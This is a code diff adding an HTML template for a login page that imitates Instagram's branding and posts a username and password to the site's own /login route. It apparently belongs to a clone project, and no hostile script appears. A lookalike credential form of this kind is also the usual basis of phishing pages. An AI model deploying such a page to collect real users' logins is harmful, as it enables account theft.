@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/assets/asset 0.png">
+    <title>Instagram Login Page</title>
+    <link rel="stylesheet" href="/login.css">
+</head>
+<body>
+    <main class="login-page">
+        <section class="auth-card" aria-label="Login form">
+            <div class="logo-wrap">
+                <img src="/assets/ig.png" alt="Instagram logo">
+            </div>
+
+            <% if (error) { %>
+                <div class="form-message error"><%= error %></div>
+            <% } %>
+
+            <form method="POST" action="/login" class="auth-form">
+                <label class="input-field">
+                    <span class="sr-only">Username or email</span>
+                    <input type="text" id="identifier" name="identifier" placeholder="Phone number, username, or email" aria-label="Username or email" required>
+                </label>
+
+                <label class="input-field">
+                    <span class="sr-only">Password</span>
+                    <input type="password" id="password" name="password" placeholder="Password" aria-label="Password" required>
+                </label>
+
+                <button type="submit" class="btn">Log In</button>
+            </form>
+
+            <div class="or-divider" aria-label="Or separator">
+                <span class="line"></span>
+                <p>OR</p>
+                <span class="line"></span>
+            </div>
+
+            <a class="facebook-login" href="/auth/facebook" data-facebook-login>
+                <img src="/assets/fb.png" alt="Facebook logo">
+                <span>Continue with Facebook</span>
+            </a>
+
+            <div class="forgot-password">
+                <span class="unavailable-link">Forgot password?</span>
+            </div>
+        </section>
+
+        <section class="signup-card" aria-label="Signup prompt">
+            <p>Don't have an account? <a href="/signup">Sign up</a></p>
+        </section>
+
+        <section class="app-links" aria-label="Download app links">
+            <p>Get the app.</p>
+            <div class="icons">
+                <span class="unavailable-link" aria-label="App Store download unavailable"><img src="/assets/asset 6.png" alt="App Store download unavailable"></span>
+                <span class="unavailable-link" aria-label="Google Play download unavailable"><img src="/assets/asset 7.png" alt="Google Play download unavailable"></span>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="links">
+            <ul>
+                <li><span class="unavailable-link">ABOUT US</span></li>
+                <li><span class="unavailable-link">SUPPORT</span></li>
+                <li><span class="unavailable-link">PRESS</span></li>
+                <li><span class="unavailable-link">API</span></li>
+                <li><span class="unavailable-link">JOBS</span></li>
+                <li><span class="unavailable-link">PRIVACY</span></li>
+                <li><span class="unavailable-link">TERMS</span></li>
+                <li><span class="unavailable-link">DIRECTORY</span></li>
+                <li><span class="unavailable-link">PROFILES</span></li>
+                <li><span class="unavailable-link">HASHTAGS</span></li>
+                <li><span class="unavailable-link">LANGUAGE</span></li>
+            </ul>
+        </div>
+        <div class="copyright">© 2024 INSTAGRAM</div>
+    </footer>
+
+    <script src="/login.js"></script>
+    <script src="/facebook.js"></script>
+</body>
+</html>
